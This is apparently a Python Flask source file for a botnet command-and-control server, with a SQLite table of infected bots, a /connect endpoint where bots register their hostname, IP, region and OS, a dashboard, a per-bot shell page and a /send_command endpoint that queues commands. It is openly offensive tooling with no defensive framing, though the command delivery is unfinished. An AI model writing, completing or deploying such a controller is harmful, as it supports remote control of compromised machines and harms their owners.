from flask import Flask,render_template, request, redirect, jsonify,session
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import *

app = Flask(__name__, template_folder="templates",static_folder='static')

db = SQLAlchemy()

app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///botnets.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = "MEMEK"

db.init_app(app)

bots = []

class Bots(db.Model):
    bot_id = Column(Integer, primary_key=True)
    hostname = Column(String(255), nullable=False)
    ip = Column(String(255), nullable=False)
    region = Column(String(255), nullable=False)
    os = Column(String(255), nullable=False)


@app.route("/")
def dashboard():
    bots = Bots.query.all()[::-1]
    return render_template("dashboard.html", bots=bots)

@app.route("/connect", methods=['GET'])
def bot_connect():
    bot_id = request.args.get("bot_id")
    hostname = request.args.get("hostname")
    ip = request.args.get("ip")
    region = request.args.get("region")
    os = request.args.get("os")

    bot = Bots(bot_id=bot_id, hostname=hostname, ip=ip, region=region, os=os)

    db.session.add(bot)
    db.session.commit()

    return ""

@app.route("/shell/<int:bot_id>", methods=['GET','POST'])
def shell(bot_id):
    id = bot_id
    return render_template("shell.html", id=id)

"""
@app.route("/api/bot/<int:id>", methods=['GET', 'POST'])
def shell_handle(id):
    data = request.get_json()
    comm = data.get('command')
    
    bots = {
        "id":id,
        "command":comm
    }

    return jsonify(bots)
"""

@app.route("/send_command")
def send_command():
    id = request.args.get("bot_id")
    command = request.args.get("command")

    if id and command:
        # Simpan command ke session
        session['command'] = command
        print(f"Session command: {session.get('command')}")

    return jsonify({"bot_id":id, "command":command})

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=8000,debug=True)